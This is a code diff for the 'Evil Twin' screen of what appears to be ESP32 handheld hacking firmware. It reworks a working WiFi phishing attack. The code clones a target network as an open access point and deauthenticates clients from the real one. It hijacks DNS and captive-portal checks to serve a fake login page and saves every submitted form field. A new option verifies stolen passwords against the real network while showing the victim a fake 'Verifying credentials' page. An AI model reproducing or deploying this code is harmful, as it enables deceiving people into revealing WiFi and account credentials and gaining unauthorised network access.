@@ -3,7 +3,6 @@
 #include "core/ScreenManager.h"
 #include "screens/wifi/WifiMenuScreen.h"
 #include "utils/WifiAttackUtil.h"
-#include "ui/actions/InputTextAction.h"
 #include "ui/actions/ShowStatusAction.h"
 
 #include <WiFi.h>
@@ -31,10 +30,17 @@ void WifiEvilTwinScreen::onItemSelected(uint8_t index)
       case 0: _selectWifi();    break;
       case 1:
         _deauth = !_deauth;
-        _showMenu();
+        _deauthSub = _deauth ? "On" : "Off";
+        _menuItems[1].sublabel = _deauthSub.c_str();
+        render();
         break;
-      case 2: _selectPortal();  break;
-      case 3: _checkPassword(); break;
+      case 2:
+        _checkPwd = !_checkPwd;
+        _checkPwdSub = _checkPwd ? "On" : "Off";
+        _menuItems[2].sublabel = _checkPwdSub.c_str();
+        render();
+        break;
+      case 3: _selectPortal();  break;
       case 4: _startAttack();   break;
     }
   } else if (_state == STATE_SELECT_WIFI && index < _scanCount) {
@@ -70,6 +76,13 @@ void WifiEvilTwinScreen::onUpdate()
   // DNS
   if (_dns) _dns->processNextRequest();
 
+  // Check queued password (must run on main loop, not async context)
+  if (_pendingPwd.length() > 0) {
+    String pwd = _pendingPwd;
+    _pendingPwd = "";
+    _tryPassword(pwd);
+  }
+
   // Deauth
   if (_deauth && _attacker && millis() - _lastDeauth > 100) {
     _attacker->deauthenticate(_target.bssid, _target.channel);
@@ -101,13 +114,14 @@ void WifiEvilTwinScreen::_showMenu()
 {
   _state = STATE_MENU;
   _networkSub = _target.ssid;
-  _deauthSub  = _deauth ? "On" : "Off";
-  _portalSub  = _portalFolder.isEmpty() ? "Default" : _portalFolder;
+  _deauthSub   = _deauth ? "On" : "Off";
+  _checkPwdSub = _checkPwd ? "On" : "Off";
+  _portalSub   = _portalFolder.isEmpty() ? "-" : _portalFolder;
 
   _menuItems[0] = {"Network",        _networkSub.c_str()};
   _menuItems[1] = {"Deauth",         _deauthSub.c_str()};
-  _menuItems[2] = {"Portal",         _portalSub.c_str()};
-  _menuItems[3] = {"Check Password"};
+  _menuItems[2] = {"Check Password", _checkPwdSub.c_str()};
+  _menuItems[3] = {"Portal",         _portalSub.c_str()};
   _menuItems[4] = {"Start"};
   setItems(_menuItems, 5);
 }
@@ -165,7 +179,7 @@ void WifiEvilTwinScreen::_selectPortal()
   }
 
   if (_portalCount == 0) {
-    ShowStatusAction::show("No portals found");
+    ShowStatusAction::show("No portals found\nWiFi > Network > Download\n> Firmware Sample Files");
     _showMenu();
     return;
   }
@@ -173,25 +187,14 @@ void WifiEvilTwinScreen::_selectPortal()
   setItems(_portalItems, _portalCount);
 }
 
-// ── Check Password ──────────────────────────────────────────────────────────
+// ── Try Password (auto-verify during attack) ───────────────────────────────
 
-void WifiEvilTwinScreen::_checkPassword()
+bool WifiEvilTwinScreen::_tryPassword(const String& password)
 {
-  if (_target.ssid == "-") {
-    ShowStatusAction::show("Select a network first!");
-    render();
-    return;
-  }
+  _addLog("[*] Checking password...");
 
-  String pwd = InputTextAction::popup("Password");
-  render();
-
-  if (pwd.isEmpty()) return;
-
-  ShowStatusAction::show("Connecting...", 0);
-
-  WiFi.mode(WIFI_STA);
-  WiFi.begin(_target.ssid.c_str(), pwd.c_str());
+  // Temporarily connect as STA to verify
+  WiFi.begin(_target.ssid.c_str(), password.c_str());
 
   unsigned long start = millis();
   while (WiFi.status() != WL_CONNECTED && millis() - start < 10000) {
@@ -199,16 +202,19 @@ void WifiEvilTwinScreen::_checkPassword()
   }
 
   bool ok = WiFi.status() == WL_CONNECTED;
-  WiFi.disconnect();
+  WiFi.disconnect(false);
 
   if (ok) {
+    _pwdResult = 1;
     if (Uni.Speaker) Uni.Speaker->playWin();
-    ShowStatusAction::show("Password correct!");
+    _addLog("[+] Password correct!");
   } else {
-    if (Uni.Speaker) Uni.Speaker->playLose();
-    ShowStatusAction::show("Password wrong!");
+    _pwdResult = -1;
+    if (Uni.Speaker) Uni.Speaker->playWrongAnswer();
+    _addLog("[!] Password wrong");
   }
-  render();
+
+  return ok;
 }
 
 // ── Portal HTML ─────────────────────────────────────────────────────────────
@@ -225,73 +231,14 @@ void WifiEvilTwinScreen::_loadPortalHtml()
       if (Uni.Storage->exists(successPath.c_str())) {
         _successHtml = Uni.Storage->readFile(successPath.c_str());
       } else {
-        _successHtml = _defaultSuccessHtml();
+        _successHtml = "<html><body><h2>Connected!</h2></body></html>";
       }
       return;
     }
   }
   _portalBasePath = "";
-  _portalHtml  = _defaultPortalHtml();
-  _successHtml = _defaultSuccessHtml();
-}
-
-String WifiEvilTwinScreen::_getMimeType(const String& path)
-{
-  if (path.endsWith(".css"))  return "text/css";
-  if (path.endsWith(".js"))   return "application/javascript";
-  if (path.endsWith(".htm"))  return "text/html";
-  if (path.endsWith(".html")) return "text/html";
-  if (path.endsWith(".png"))  return "image/png";
-  if (path.endsWith(".jpg"))  return "image/jpeg";
-  if (path.endsWith(".gif"))  return "image/gif";
-  if (path.endsWith(".svg"))  return "image/svg+xml";
-  if (path.endsWith(".ico"))  return "image/x-icon";
-  return "text/plain";
-}
-
-void WifiEvilTwinScreen::_serveStaticFile(AsyncWebServerRequest* req, const String& path)
-{
-  if (_portalBasePath.isEmpty() || !Uni.Storage || !Uni.Storage->isAvailable()) {
-    req->redirect("/");
-    return;
-  }
-  String filePath = _portalBasePath + path;
-  if (Uni.Storage->exists(filePath.c_str())) {
-    String content = Uni.Storage->readFile(filePath.c_str());
-    req->send(200, _getMimeType(path), content);
-  } else {
-    req->redirect("/");
-  }
-}
-
-const char* WifiEvilTwinScreen::_defaultPortalHtml()
-{
-  return
-    "<html><head><meta name=\"viewport\" content=\"width=device-width\">"
-    "<title>WiFi Login</title>"
-    "<style>body{font-family:sans-serif;margin:40px auto;max-width:350px;text-align:center}"
-    "input{width:90%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px}"
-    "button{width:95%;padding:12px;background:#4CAF50;color:white;border:none;border-radius:4px;cursor:pointer}"
-    "</style></head><body>"
-    "<h2>WiFi Authentication</h2>"
-    "<p>Please enter your credentials to connect</p>"
-    "<form action=\"/\" method=\"POST\">"
-    "<input name=\"email\" placeholder=\"Email or Username\" required>"
-    "<input name=\"password\" type=\"password\" placeholder=\"Password\" required>"
-    "<button type=\"submit\">Connect</button>"
-    "</form></body></html>";
-}
-
-const char* WifiEvilTwinScreen::_defaultSuccessHtml()
-{
-  return
-    "<html><head><meta name=\"viewport\" content=\"width=device-width\">"
-    "<title>Success</title>"
-    "<style>body{font-family:sans-serif;margin:40px auto;max-width:350px;text-align:center}"
-    "</style></head><body>"
-    "<h2>Connected!</h2>"
-    "<p>You are now connected to the network.</p>"
-    "</body></html>";
+  _portalHtml  = "";
+  _successHtml = "";
 }
 
 // ── Start / Stop Attack ─────────────────────────────────────────────────────
@@ -303,6 +250,10 @@ void WifiEvilTwinScreen::_startAttack()
     ShowStatusAction::show("Select a network first!");
     return;
   }
+  if (_portalFolder.isEmpty()) {
+    ShowStatusAction::show("Select a portal first!");
+    return;
+  }
 
   _state     = STATE_RUNNING;
   _logCount  = 0;
@@ -312,9 +263,17 @@ void WifiEvilTwinScreen::_startAttack()
 
   _loadPortalHtml();
 
-  // Create soft AP cloning the target SSID on target channel
-  WiFi.mode(WIFI_AP_STA);
-  WiFi.softAP(_target.ssid.c_str(), "", _target.channel);
+  // Init attacker without its own AP — we manage softAP ourselves
+  if (_deauth) {
+    _attacker = new WifiAttackUtil(false);
+    _addLog("Deauth enabled");
+  } else {
+    WiFi.mode(WIFI_AP_STA);
+  }
+
+  // Create soft AP cloning the target SSID
+  WiFi.softAP(_target.ssid.c_str(), NULL, _target.channel, 0, 4);
+  delay(100);
   IPAddress apIP = WiFi.softAPIP();
 
   _addLog("AP started");
@@ -324,63 +283,103 @@ void WifiEvilTwinScreen::_startAttack()
   _dns->start(53, "*", apIP);
   _addLog("DNS started");
 
-  // Deauth
-  if (_deauth) {
-    _attacker = new WifiAttackUtil();
-    _addLog("Deauth enabled");
-  }
-
   // Web server
   _server = new AsyncWebServer(80);
 
-  // Captive portal detection endpoints
-  _server->on("/generate_204", HTTP_GET, [this](AsyncWebServerRequest* req) {
-    req->redirect("/");
-  });
-  _server->on("/fwlink", HTTP_GET, [this](AsyncWebServerRequest* req) {
-    req->redirect("/");
-  });
-  _server->on("/hotspot-detect.html", HTTP_GET, [this](AsyncWebServerRequest* req) {
-    req->redirect("/");
-  });
-  _server->on("/connecttest.txt", HTTP_GET, [this](AsyncWebServerRequest* req) {
-    req->redirect("/");
-  });
+  // Serve portal (also handles captive portal detection URLs via onNotFound redirect)
+  auto servePortalSilent = [this](AsyncWebServerRequest* req) {
+    req->send(200, "text/html", _portalHtml);
+  };
 
-  // Serve portal
   _server->on("/", HTTP_GET, [this](AsyncWebServerRequest* req) {
-    // Check for GET params (some portals use GET)
-    if (req->hasParam("password")) {
-      String email = req->hasParam("email") ? req->getParam("email")->value() : "";
-      String pwd   = req->getParam("password")->value();
-      _saveCaptured(email, pwd);
-      req->send(200, "text/html", _successHtml);
-      return;
-    }
     _addLog("[+] Portal visited");
     req->send(200, "text/html", _portalHtml);
   });
+  _server->on("/generate_204", HTTP_GET, servePortalSilent);
+  _server->on("/fwlink", HTTP_GET, servePortalSilent);
+  _server->on("/hotspot-detect.html", HTTP_GET, servePortalSilent);
+  _server->on("/connecttest.txt", HTTP_GET, servePortalSilent);
 
-  // Handle POST
+  // Handle POST — save all form data
   _server->on("/", HTTP_POST, [this](AsyncWebServerRequest* req) {
-    String email, pwd;
-    if (req->hasParam("email", true))    email = req->getParam("email", true)->value();
-    if (req->hasParam("password", true)) pwd   = req->getParam("password", true)->value();
-    _saveCaptured(email, pwd);
-    req->send(200, "text/html", _successHtml);
+    String data;
+    String pwd;
+    for (int i = 0; i < (int)req->params(); i++) {
+      const AsyncWebParameter* p = req->getParam(i);
+      if (!p->isPost()) continue;
+      if (data.length() > 0) data += "\n";
+      data += p->name() + "=" + p->value();
+      if (p->name() == "password") pwd = p->value();
+    }
+    _saveCaptured(data);
+    if (_checkPwd && pwd.length() > 0) {
+      char logBuf[60];
+      snprintf(logBuf, sizeof(logBuf), "[+] Pwd: %s", pwd.c_str());
+      _addLog(logBuf);
+
+      _pendingPwd = pwd;
+      _pwdResult = 0;  // pending
+      // Serve a "connecting" page that polls /status
+      req->send(200, "text/html",
+        "<html><head><meta name=\"viewport\" content=\"width=device-width\">"
+        "<style>body{font-family:sans-serif;text-align:center;margin:40px auto;max-width:350px}"
+        ".dots::after{content:'';animation:d 1.5s steps(4) infinite}"
+        "@keyframes d{0%{content:''}25%{content:'.'}50%{content:'..'}75%{content:'...'}}"
+        "</style></head><body>"
+        "<h2>Connecting<span class=\"dots\"></span></h2>"
+        "<p id=\"msg\">Verifying credentials...</p>"
+        "<script>"
+        "setInterval(function(){"
+        "fetch('/status').then(r=>r.text()).then(s=>{"
+        "if(s==='ok'){document.getElementById('msg').textContent='Connected!';setTimeout(()=>location='/',2000)}"
+        "else if(s==='fail'){document.getElementById('msg').textContent='Incorrect password';setTimeout(()=>location='/',2000)}"
+        "})},2000);"
+        "</script></body></html>");
+    } else {
+      req->send(200, "text/html", _successHtml);
+    }
   });
 
   // Catch-all: serve static files from portal folder, or redirect to portal
-  _server->onNotFound([this](AsyncWebServerRequest* req) {
-    String path = req->url();
-    if (path.endsWith(".css") || path.endsWith(".js") ||
-        path.endsWith(".png") || path.endsWith(".jpg") ||
-        path.endsWith(".gif") || path.endsWith(".svg") ||
-        path.endsWith(".ico")) {
-      _serveStaticFile(req, path);
+  _server->onNotFound([](AsyncWebServerRequest* req) {
+    req->redirect("/");
+  });
+
+  // Serve static files from storage
+  if (Uni.Storage && Uni.Storage->isAvailable()) {
+    if (!_portalBasePath.isEmpty()) {
+      _server->serveStatic("/", Uni.Storage->getFS(), _portalBasePath.c_str());
+    }
+    _server->serveStatic("/captives/", Uni.Storage->getFS(), "/unigeek/wifi/captives/");
+  }
+
+  // Captives index page
+  _server->on("/captives", HTTP_GET, [this](AsyncWebServerRequest* req) {
+    if (!Uni.Storage || !Uni.Storage->isAvailable()) {
+      req->send(200, "text/html", "<html><body><h3>No storage</h3></body></html>");
       return;
     }
-    req->redirect("/");
+    IStorage::DirEntry entries[20];
+    uint8_t count = Uni.Storage->listDir("/unigeek/wifi/captives", entries, 20);
+    String html = "<html><head><meta name=\"viewport\" content=\"width=device-width\">"
+                  "<style>body{font-family:sans-serif;margin:20px}a{display:block;padding:6px 0}</style>"
+                  "</head><body><h3>Captured Credentials</h3>";
+    int found = 0;
+    for (int i = 0; i < count; i++) {
+      if (entries[i].isDir) continue;
+      html += "<a href=\"/captives/" + String(entries[i].name) + "\">" + String(entries[i].name) + "</a>";
+      found++;
+    }
+    if (found == 0) html += "<p>No captures yet.</p>";
+    html += "</body></html>";
+    req->send(200, "text/html", html);
+  });
+
+  // Status endpoint for async password check polling
+  _server->on("/status", HTTP_GET, [this](AsyncWebServerRequest* req) {
+    if (_pwdResult == 1)       req->send(200, "text/plain", "ok");
+    else if (_pwdResult == -1) req->send(200, "text/plain", "fail");
+    else                       req->send(200, "text/plain", "pending");
   });
 
   _server->begin();
@@ -415,21 +414,17 @@ void WifiEvilTwinScreen::_stopAttack()
 
 // ── Credential Capture ──────────────────────────────────────────────────────
 
-void WifiEvilTwinScreen::_saveCaptured(const String& email, const String& password)
+void WifiEvilTwinScreen::_saveCaptured(const String& data)
 {
   _pwdCount++;
+  _addLog("[+] Credential received");
 
-  char logMsg[60];
-  snprintf(logMsg, sizeof(logMsg), "[+] Pwd: %s", password.c_str());
-  _addLog(logMsg);
-
-  if (Uni.Speaker) Uni.Speaker->playNotification();
+  if (!_checkPwd && Uni.Speaker) Uni.Speaker->playNotification();
 
   if (!Uni.Storage || !Uni.Storage->isAvailable()) return;
 
   Uni.Storage->makeDir("/unigeek/wifi/captives");
 
-  // Build filename from BSSID and SSID
   char bssidStr[18];
   snprintf(bssidStr, sizeof(bssidStr), "%02X%02X%02X%02X%02X%02X",
            _target.bssid[0], _target.bssid[1], _target.bssid[2],
@@ -437,14 +432,10 @@ void WifiEvilTwinScreen::_saveCaptured(const String& email, const String& passwo
 
   String filename = "/unigeek/wifi/captives/" + String(bssidStr) + "_" + _target.ssid + ".txt";
 
-  // Append credential
   fs::File f = Uni.Storage->open(filename.c_str(), FILE_APPEND);
   if (f) {
-    if (!email.isEmpty()) {
-      f.print(email);
-      f.print(":");
-    }
-    f.println(password);
+    f.println("---");
+    f.println(data);
     f.close();
   }
 }
@@ -473,27 +464,35 @@ void WifiEvilTwinScreen::_drawLog()
   sp.createSprite(bodyW(), bodyH());
   sp.fillSprite(TFT_BLACK);
 
-  // Status bar
-  char status[40];
-  snprintf(status, sizeof(status), "Pwd: %d  |  %s", _pwdCount, _target.ssid.c_str());
-  sp.setTextDatum(TL_DATUM);
-  sp.setTextColor(TFT_GREEN, TFT_BLACK);
-  sp.drawString(status, 2, 2, 1);
-
-  // Separator
-  sp.drawFastHLine(0, 12, bodyW(), TFT_DARKGREY);
-
-  // Log lines
-  sp.setTextColor(TFT_WHITE, TFT_BLACK);
-  int lineH  = 10;
-  int startY = 14;
-  int maxVisible = (bodyH() - startY) / lineH;
+  // Log lines (top area, above status bar)
+  int lineH    = 10;
+  int statusH  = 14;
+  int logAreaH = bodyH() - statusH;
+  int maxVisible = logAreaH / lineH;
   int startIdx   = _logCount > maxVisible ? _logCount - maxVisible : 0;
 
+  sp.setTextDatum(TL_DATUM);
+  sp.setTextColor(TFT_WHITE, TFT_BLACK);
   for (int i = startIdx; i < _logCount; i++) {
-    int y = startY + (i - startIdx) * lineH;
+    int y = (i - startIdx) * lineH;
     sp.drawString(_logLines[i], 2, y, 1);
   }
+
+  // Separator
+  int sepY = bodyH() - statusH;
+  sp.drawFastHLine(0, sepY, bodyW(), TFT_DARKGREY);
+
+  // Status bar at bottom — left: password count, right: SSID
+  int barY = sepY + 2;
+  sp.setTextColor(TFT_GREEN, TFT_BLACK);
+  sp.setTextDatum(TL_DATUM);
+
+  char pwdLabel[16];
+  snprintf(pwdLabel, sizeof(pwdLabel), "Pwd: %d", _pwdCount);
+  sp.drawString(pwdLabel, 2, barY, 1);
+
+  sp.setTextDatum(TR_DATUM);
+  sp.drawString(_target.ssid.substring(0, 16), bodyW() - 2, barY, 1);
 
   sp.pushSprite(bodyX(), bodyY());
   sp.deleteSprite();
